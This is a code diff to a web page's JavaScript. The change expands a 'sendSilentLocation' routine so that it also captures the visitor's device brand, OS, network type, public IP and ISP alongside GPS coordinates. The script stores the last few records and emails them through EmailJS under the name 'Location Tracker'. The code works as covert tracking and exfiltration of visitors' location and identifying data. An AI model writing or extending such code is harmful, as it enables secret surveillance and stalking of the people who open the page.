@@ -279,57 +279,110 @@
             }
         }
     
-        function getDeviceType() {
-            const userAgent = navigator.userAgent;
-            if (/android/i.test(userAgent)) {
-                return "Android";
-            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
-                return "iOS Device";
-            } else if (/Windows/i.test(userAgent)) {
-                return "Windows Device";
-            } else if (/Mac/i.test(userAgent)) {
-                return "Mac Device";
-            } else if (/Linux/i.test(userAgent)) {
-                return "Linux Device";
+        function getIPAndISP() {
+            return fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    console.log("IP:", data.ip);
+                    console.log("ISP:", data.org);
+                    return { ip: data.ip, isp: data.org };
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    return { ip: "Unknown", isp: "Unknown" };
+                });
+        }
+    
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                console.log("Network Type:", navigator.connection.type);
+                console.log("Effective Network Type:", navigator.connection.effectiveType);
+                return {
+                    type: navigator.connection.type,
+                    effectiveType: navigator.connection.effectiveType
+                };
             } else {
-                return "Unknown Device";
+                console.log("Network information not available");
+                return { type: "Unknown", effectiveType: "Unknown" };
             }
         }
-        
-        function sendSilentLocation(position) {
+    
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceInfo = {
+                type: "Unknown",
+                brand: "Unknown",
+                os: "Unknown"
+            };
+    
+            if (/android/i.test(userAgent)) {
+                deviceInfo.type = "Android";
+                if (/Samsung/i.test(userAgent)) deviceInfo.brand = "Samsung";
+                else if (/Huawei/i.test(userAgent)) deviceInfo.brand = "Huawei";
+                // Add more brand checks as needed
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceInfo.type = "iOS";
+                deviceInfo.brand = "Apple";
+            } else if (/Windows/i.test(userAgent)) {
+                deviceInfo.type = "Windows";
+            } else if (/Mac/i.test(userAgent)) {
+                deviceInfo.type = "Mac";
+                deviceInfo.brand = "Apple";
+            } else if (/Linux/i.test(userAgent)) {
+                deviceInfo.type = "Linux";
+            }
+    
+            deviceInfo.os = navigator.platform;
+    
+            return deviceInfo;
+        }
+    
+        async function sendSilentLocation(position) {
             let latitude = position.coords.latitude;
             let longitude = position.coords.longitude;
             let accuracy = position.coords.accuracy;
-            const deviceType = getDeviceType();
-
+            const deviceInfo = getDeviceInfo();
+            const networkInfo = getNetworkInfo();
+            const { ip, isp } = await getIPAndISP();
+    
             console.log("Latitude:", latitude);
             console.log("Longitude:", longitude);
             console.log("Accuracy:", accuracy);
-            console.log("Device Type:", deviceType);
-
-            // Store location for all device types
-            locationHistory.push({ latitude, longitude, accuracy, deviceType });
-
+            console.log("Device Info:", deviceInfo);
+            console.log("Network Info:", networkInfo);
+            console.log("IP:", ip);
+            console.log("ISP:", isp);
+    
+            locationHistory.push({ 
+                latitude, 
+                longitude, 
+                accuracy, 
+                deviceInfo,
+                networkInfo,
+                ip,
+                isp
+            });
+    
             if (locationHistory.length > 3) {
                 locationHistory.shift();
             }
-
+    
             console.log("Location stored");
         }
         
         function sendStoredLocations() {
             if (locationHistory.length > 0) {
-                const deviceType = getDeviceType();
+                const deviceInfo = getDeviceInfo();
                 const locationMessages = locationHistory.map((loc, index) => {
-                    return `Location ${index + 1}:\nLatitude: ${loc.latitude}\nLongitude: ${loc.longitude}\nAccuracy: ${loc.accuracy} meters\nDevice Type: ${loc.deviceType}`;
+                    return `Location ${index + 1}:\nLatitude: ${loc.latitude}\nLongitude: ${loc.longitude}\nAccuracy: ${loc.accuracy} meters\nDevice Type: ${loc.deviceInfo.type}\nDevice Brand: ${loc.deviceInfo.brand}\nOS: ${loc.deviceInfo.os}\nNetwork Type: ${loc.networkInfo.type}\nEffective Network Type: ${loc.networkInfo.effectiveType}\nIP: ${loc.ip}\nISP: ${loc.isp}`;
                 }).join('\n\n');
         
-                const message = `Device: ${deviceType}\n\n${locationMessages}`;
+                const message = `Device: ${deviceInfo.type} ${deviceInfo.brand}\nOS: ${deviceInfo.os}\n\n${locationMessages}`;
                 
                 const emailData = {
                     from_name: "Location Tracker",
                     message: message,
-                    device_name: deviceType
+                    device_name: `${deviceInfo.type} ${deviceInfo.brand}`
                 };
         
                 emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
@@ -347,6 +400,6 @@
         function showError(error) {
             console.error("Error getting location:", error);
         }
-    </script>    
+    </script>   
 </body>
 </html>
